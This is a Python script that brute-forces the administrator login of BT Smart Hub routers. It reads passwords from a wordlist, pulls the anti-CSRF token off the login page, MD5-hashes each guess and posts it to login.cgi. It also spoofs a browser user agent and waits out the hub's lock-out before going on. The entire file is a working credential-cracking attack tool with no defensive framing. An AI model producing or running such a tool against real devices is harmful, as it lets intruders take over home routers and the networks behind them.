#!/usr/bin/env python3
# brute_bt_hub_login.py  – fixed headers / payload format for SH1/SH2 2024-25 firmware

import base64, re, requests
from time import sleep
from urllib.parse import urljoin
import hashlib

HUB       = "http://192.168.1.254/"
WORDLIST  = "password.txt"

FAIL_MARKERS = {"login_error", "login_lock"}
LOCK_STRING  = "You're not allowed to enter the admin password for"

TIMEOUT  = 5
BACKOFF  = 95

def hash_pwd(pwd: str) -> str:
    """Hub-expected encoding: lowercase hex MD5 digest."""
    return hashlib.md5(pwd.encode("utf-8")).hexdigest()

def logged_in(html: str) -> bool:
    if any(m in html for m in FAIL_MARKERS):
        return False
    return "system.htm" in html or "Hub Manager" in html


def attempt(password: str, session: requests.Session) -> bool:
    """
    Send *one* password; return True on success, False on failure / lock-out.
    The session object is re-used to keep cookies between attempts.
    """
    # ── 1. fetch login page (gets the session cookie + hidden 'v' token) ─────────
    r0   = session.get(urljoin(HUB, "home.htm"), timeout=TIMEOUT, verify=False)
    token = ""
    m = re.search(r'name="v"\s+value="([^"]+)"', r0.text)
    if m:                         # SH2 firmware – include anti-CSRF token
        token = m.group(1)

    # ── 2. build payload exactly like the browser does ──────────────────────────
    payload_items = [
        ("GO",  "system.htm"),              # matches the browser’s redirect
        ("usr", "admin"),
        ("pws", hash_pwd(password))
    ]
    payload_text = "&".join(f"{k}={v}" for k, v in payload_items)

    # The hub’s JavaScript serialises as *plain text*, not url-encoded
    payload_text = "&".join(f"{k}={v}" for k, v in payload_items)

    headers = {
        "Content-Type": "text/plain; charset=UTF-8",
        "Referer":      HUB,                  # exactly what DevTools showed
    }

    r1 = session.post(
        urljoin(HUB, "login.cgi"),
        data=payload_text,
        headers=headers,
        timeout=TIMEOUT,
        allow_redirects=True,
        verify=False,
    )

    html = r1.text

    if LOCK_STRING in html:
        print("▲ Hub is locked – pausing", BACKOFF, "s")
        sleep(BACKOFF)
        return False

    return logged_in(html)


def main() -> None:
    try:
        with open(WORDLIST, encoding="utf-8", errors="ignore") as fh:
            with requests.Session() as s:
                # optional: spoof normal UA (some firmware gives cookie only then)
                s.headers.update(
                    {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                                   "AppleWebKit/537.36 (KHTML, like Gecko) "
                                   "Chrome/135.0.0.0 Safari/537.36"}
                )

                for pwd in map(str.strip, fh):
                    if not pwd:
                        continue

                    print(f"[+] Trying {pwd!r:<20}", end="")
                    ok = attempt(pwd, s)

                    if ok:
                        print("  ✅  SUCCESS")
                        print("\nPassword found:", pwd)
                        return
                    else:
                        print("  ✗  fail")

        print("\n[-] Word-list exhausted – password not found.")
    except FileNotFoundError:
        print("Word-list file not found:", WORDLIST)
    except KeyboardInterrupt:
        print("\nInterrupted by user.")


if __name__ == "__main__":
    main()
